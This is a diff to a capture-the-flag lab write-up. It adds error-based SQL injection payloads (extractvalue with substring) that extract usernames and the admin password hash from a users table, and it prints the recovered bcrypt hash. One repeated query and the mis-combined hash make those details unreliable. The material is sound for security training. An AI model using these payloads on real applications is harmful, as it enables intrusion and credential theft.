@@ -115,7 +115,7 @@ Machine IP: 10.10.10.113 - Debian
 - Columns Found: id, username, password, mail and role.
 
 ## Usernames and Passwords
-  - Extract: Usernames and passwords.
+  - Extract: Usernames.
   - Query (User 1): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 0,1)))-- -`.
 ![image](https://user-images.githubusercontent.com/83878909/229365056-4de5f991-d941-4753-9d09-866688fd02f2.png)
   - Query (User 2): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
@@ -124,3 +124,13 @@ Machine IP: 10.10.10.113 - Debian
 ![image](https://user-images.githubusercontent.com/83878909/229365296-3ff1f74f-2180-4c29-8111-83d82aeaebf8.png)
   - Query (User 4): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
 ![image](https://user-images.githubusercontent.com/83878909/229365253-75ce97e6-d60d-4278-9881-9c0b5cc94add.png)
+
+  - Extract: Passwords.
+  - Query: `') and extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229367688-1cf32661-e990-4ac2-b893-a29fb7746b17.png)
+  - The above query returned the password for user `admin` however the passqord is not complete. The SQL query needs to be modified and then the password will be return in two parts.
+  - Query1 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229367688-1cf32661-e990-4ac2-b893-a29fb7746b17.png)
+  - Query2 : (User:admin - Password) - `') and extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 30)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229368053-208b6b3e-871a-47ae-b549-fa88babc2660.png)
+  - Combining Both: `$2y$10$z/d5GiwZuFqjY1jRiKIPzuPX` + `PXKt0SthLOyU438ajqRBtrb7ZADpwq.` = `$2y$10$z/d5GiwZuFqjY1jRiKIPzuKt0SthLOyU438ajqRBtrb7ZADpwq.`
